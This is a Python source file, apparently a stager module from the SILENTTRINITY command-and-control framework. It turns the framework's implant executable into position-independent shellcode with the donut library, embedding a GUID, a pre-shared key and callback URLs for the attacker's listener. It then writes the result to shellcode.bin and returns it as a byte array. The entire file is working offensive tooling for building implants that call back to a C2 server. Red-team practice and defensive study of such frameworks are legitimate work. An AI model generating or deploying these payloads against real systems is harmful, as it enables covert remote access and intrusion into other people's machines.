import donut
import uuid
from silenttrinity.core.events import Events
from silenttrinity.core.teamserver import ipc_server
from silenttrinity.core.teamserver.crypto import gen_stager_psk
from silenttrinity.core.utils import shellcode_to_int_byte_array, print_bad, get_path_in_package, print_good, shellcode_to_hex_byte_array
from silenttrinity.core.teamserver.stager import Stager

class STStager(Stager):
    def __init__(self):
        self.name = 'shellcode'
        self.description = 'Create SILENTTRINITY Shellcode'
        self.suggestions = ''
        self.extension = 'bin'
        self.author = '@ozzieoffsec, @OOffsec'
        self.options = {}

    def generate(self, listener):

        guid = uuid.uuid4()
        psk = gen_stager_psk()

        c2_urls = ','.join(
            filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
            )

        #Determine which architecture to use.
        #Default is amd64+86 (dual-mode)
        arch = 3

        #User can specify 64-bit or 32-bit
        #if self.options['Architecture']['Value'] == 'x64':
         #   arch = 2
        #elif self.options['Architecture']['Value'] == 'x86':
         #   arch = 1

        donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=arch)

        f = open("shellcode.bin", "wb")
        f.write(donut_shellcode)
        f.close()

        shellcode = shellcode_to_int_byte_array(donut_shellcode)
        #shellcode = shellcode_to_hex_byte_array(donut_shellcode)
        #shellcode = donut_shellcode

        return guid, psk, shellcode
